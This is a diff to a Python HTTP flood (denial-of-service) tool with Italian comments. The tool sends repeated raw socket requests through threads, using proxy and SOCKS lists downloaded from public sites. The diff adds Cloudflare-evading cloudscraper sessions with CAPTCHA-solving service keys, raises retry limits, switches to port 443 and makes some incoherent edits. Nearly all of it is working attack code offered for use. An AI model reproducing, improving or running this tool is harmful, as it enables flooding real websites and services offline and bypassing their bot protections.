@@ -49,16 +49,10 @@ print('''
 
 							C0d3d by Hardy 
 	''') # la grafica ci sta
-                                         
-response = requests.get(
-    'https://api.github.com/search/repositories',
-    params={'r': 'requests+language:python'},
-    headers={'Accept': 'application/vnd.github.v3.text-match+json'},
-)
-
+                                                                                            
 FIFTEEN_MINUTES = 900
 
-@on_exception(expo, RateLimitException, max_tries=8)
+@on_exception(expo, RateLimitException, max_tries=800)
 @limits(calls=150, period=FIFTEEN_MINUTES)
 def call_api(url):
     response = requests.get(url)
@@ -164,7 +158,38 @@ def call_api(url):
 requests.get = ("google.com")
 
 app = web.Application(middlewares=[LimitMiddleware(requests=1000)])
-                                                             
+
+scraper = cloudscraper.create_scraper(debug=True)
+scraper = cloudscraper.create_scraper(delay=1000)
+proxies = {"http": "http://localhost:8080", "https": "http://localhost:8080"}
+scraper = cloudscraper.create_scraper(
+    browser={
+        'browser': 'firefox',
+        'mobile': False
+    }
+)
+scraper = cloudscraper.create_scraper(
+    browser={
+        'custom': 'ScraperBot/1.0',
+    }
+)
+scraper = cloudscraper.create_scraper(
+  interpreter='nodejs',
+  recaptcha={
+    'provider': '2captcha',
+    'api_key': '1abc234de56fab7c89012d34e56fa7b8'
+  }
+)
+scraper = cloudscraper.create_scraper(
+  interpreter='nodejs',
+  recaptcha={
+    'provider': 'anticaptcha',
+    'api_key': 'P6KLRNy7h3K160ZmYNUOAce7'
+  }
+)
+session = requests.session()
+scraper = cloudscraper.create_scraper(sess=session)
+                                                                                                                                                                                                                      
 global data                          
 headers = open("headers.txt", "r")
 data = headers.read()
@@ -853,7 +878,7 @@ def starturl(): # in questa funzione setto l'url per renderlo usabile per il fut
 	try:               
 		urlport = url.replace("http://", "").replace("https://", "").split("/")[0].split(":")[1]
 	except:
-		urlport = "80"
+		urlport = "443"
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     
 	floodmode()
                                                     
@@ -922,18 +947,18 @@ def choicedownproxy():
 	choice4 = input("Do you want to download a new list of proxy? Answer 'y' to do it: ")
 	if choice4 == "y":
 		urlproxy = "http://free-proxy-list.net/"
-		proxypost(urlproxy)
+		proxyget(urlproxy)
 	else:
 		proxylist()
-                        
+                                                 
 def choicedownsocks():
 	choice4 = input("Do you want to download a new list of socks? Answer 'y' to do it: ")
 	if choice4 == "y":
 		urlproxy = "https://www.socks-proxy.net/"
-		proxypost(urlproxy)
+		proxyget(urlproxy)
 	else:
 		proxylist()
-                        
+                         
 def proxyget(urlproxy): # lo dice il nome, questa funzione scarica i proxies
 	try:
 		req = urllib.request.Request(("%s") % (urlproxy))       # qua impostiamo il sito da dove scaricare.
@@ -1367,7 +1392,7 @@ class RequestDefaultHTTP(threading.Thread): # la classe del multithreading
 				s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # creazione socket
 				s.connect((str(url2), int(urlport))) # connessione
 				s.send (str.encode(request)) # invio
-				print ("Request sent! @", self.counter) # print req + counter
+				print ("Запрос отправлен!! @", self.counter) # print req + counter
 				try: # invia altre richieste nello stesso thread
 					for y in range(multiple): # fattore di moltiplicazione
 						s.send(str.encode(request)) # encode in bytes della richiesta HTTP
@@ -1379,3 +1404,4 @@ class RequestDefaultHTTP(threading.Thread): # la classe del multithreading
 
 if __name__ == '__main__':
 	starturl() # questo fa startare la prima funzione del programma, che a sua volta ne starta un altra, poi un altra, fino ad arrivare all'attacco.
+                                                    
